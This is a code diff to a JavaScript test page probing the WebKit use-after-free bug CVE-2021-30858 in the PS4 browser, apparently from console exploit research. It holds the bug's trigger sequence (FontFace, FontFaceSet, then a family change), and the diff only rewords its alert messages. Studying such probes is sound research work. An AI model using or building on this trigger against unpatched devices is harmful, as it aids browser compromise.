@@ -4,14 +4,14 @@
 
         async function testwebkit() {
 
-            alert("Testing CVE-2021-30858 on PS4 Browser.. Press OK to check if bug is not patched!!!");
+            alert("Testing CVE-2021-30858 on PS4 Browser.. Press OK to check bug API!!!");
             let font = new FontFace('font1', 'url()',{});
-            alert("Step one. OK!!");
+            alert("FontFace(). OK!!");
             var fontFaceSet = new FontFaceSet([font]);
-            alert("Step two. OK!!");
+            alert("FontFaceSet(). OK!!");
             //UAF CODE...
             font.family = 'font2';
-            alert("CVE-2021-30858 Webkit exploit bug.. Seems Working :P!!");
+            alert("CVE-2021-30858 Webkit exploit bug.. FontFaceSet() and FontFace() are available on PS4 Browser :P!!");
 
         }
 
